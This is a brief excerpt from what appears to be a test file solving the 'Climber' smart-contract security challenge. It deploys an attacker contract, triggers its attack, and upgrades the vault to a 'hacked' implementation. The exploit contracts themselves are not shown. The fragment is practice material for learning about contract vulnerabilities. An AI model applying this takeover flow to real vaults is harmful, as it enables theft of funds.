...
describe('[Challenge] Climber', function () {
    ...
    it('Execution', async function () {
        ...
        const hackedVault = await (await ethers.getContractFactory('ClimberVaultHacked', deployer)).deploy();

        const attacker = await (await ethers.getContractFactory('ClimberTheAttacker', player)).deploy(vault.address, timelock.address, token.address, { gasLimit: 30000000 });
        await attacker.connect(player).attack({ gasLimit: 30000000 });
        await attacker.connect(player).upgradeVault(hackedVault.address);
    });
